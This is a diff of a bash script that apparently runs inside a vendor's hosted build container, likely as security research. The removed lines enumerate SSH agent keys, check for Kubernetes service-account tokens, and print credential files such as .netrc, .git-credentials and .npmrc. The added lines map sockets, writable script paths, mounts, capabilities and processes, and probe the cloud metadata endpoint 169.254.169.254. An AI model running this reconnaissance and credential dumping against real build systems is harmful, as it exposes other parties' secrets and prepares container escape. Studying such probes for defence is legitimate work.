@@ -1,26 +1,27 @@
 #!/usr/bin/env bash
-# Prove EXPOSURE of the build-stage SSH agent to customer code.
-# Lists agent identities + public keys ONLY. Does not export private material
-# and does not authenticate to any host.
+# Enumerate the build container's runtime position: sockets, mounts, egress, writability.
 set +e
-B="YEXTP1SSH"; echo "$B-BEGIN"
-echo "$B id=$(id)"
-echo "$B SSH_AUTH_SOCK=${SSH_AUTH_SOCK:-UNSET}"
-echo "$B-ENVSSH-START"; env | grep -ai 'ssh\|git\|npm_config' ; echo "$B-ENVSSH-END"
-echo "$B sock_ls=$(ls -la "$SSH_AUTH_SOCK" 2>&1)"
-echo "$B sock_r=$([ -r "$SSH_AUTH_SOCK" ] && echo YES || echo NO) sock_w=$([ -w "$SSH_AUTH_SOCK" ] && echo YES || echo NO)"
-echo "$B-AGENT-START"
-echo "-- ssh-add -l (fingerprints) --"; ssh-add -l 2>&1
-echo "-- ssh-add -L (PUBLIC keys) --";  ssh-add -L 2>&1
-echo "$B-AGENT-END"
-echo "$B-K8S-START"
-ls -la /var/run/secrets/ 2>&1 | head -20; ls -la /run/secrets/ 2>&1 | head -20
-for f in token namespace ca.crt; do p=/var/run/secrets/kubernetes.io/serviceaccount/$f; echo "$B k8s:$f=$([ -f "$p" ] && echo PRESENT || echo absent)"; done
-echo "$B-K8S-END"
-echo "$B-CREDFILES-START"
-for f in "$HOME/.netrc" "$HOME/.git-credentials" "$HOME/.npmrc" /opt/buildhome/.npmrc /opt/buildhome/repo/.npmrc "$HOME/.ssh/config" "$HOME/.ssh/known_hosts"; do
-  echo "--- $f ($([ -f "$f" ] && echo present || echo absent))"; [ -f "$f" ] && cat "$f" 2>&1
+B="YEXTP2"; echo "$B-BEGIN"
+echo "$B-RUNDIRS-START"
+for d in /run /run/buildkit /var/run /tmp /scripts /scripts/bin /scripts/user_commands; do
+  echo "--- ls -la $d"; ls -la "$d" 2>&1 | head -30
 done
-echo "$B-CREDFILES-END"
-echo "$B-GITCFG-START"; cat /opt/buildhome/repo/.git/config 2>&1; echo "$B-GITCFG-END"
+echo "$B-RUNDIRS-END"
+echo "$B-SOCKETS-START"
+find / -xdev -type s 2>/dev/null | head -40
+echo "$B-SOCKETS-END"
+echo "$B-WRITABLE-START"
+for p in /scripts /scripts/bin /scripts/user_commands /run/buildkit /opt/buildhome; do
+  echo "$p w=$([ -w "$p" ] && echo YES || echo NO)"
+done
+echo "$B-WRITABLE-END"
+echo "$B-MOUNTS-START"; cat /proc/mounts 2>&1 | head -40; echo "$B-MOUNTS-END"
+echo "$B-CGROUP-START"; cat /proc/1/cgroup 2>&1 | head -10; cat /proc/self/cgroup 2>&1 | head -10; echo "$B-CGROUP-END"
+echo "$B-CAPS-START"; cat /proc/self/status 2>/dev/null | grep -iE 'cap|uid|gid|seccomp|nospid'; echo "$B-CAPS-END"
+echo "$B-EGRESS-START"
+for t in "https://sandbox.yext.com/robots.txt" "http://169.254.169.254/latest/meta-data/" "https://api.github.com/rate_limit"; do
+  echo "--- $t"; curl -s -m 4 -o /dev/null -w 'http=%{http_code} ip=%{remote_ip}\n' "$t" 2>&1
+done
+echo "$B-EGRESS-END"
+echo "$B-PROCS-START"; ps -ef 2>&1 | head -20; echo "$B-PROCS-END"
 echo "$B-END"; exit 0
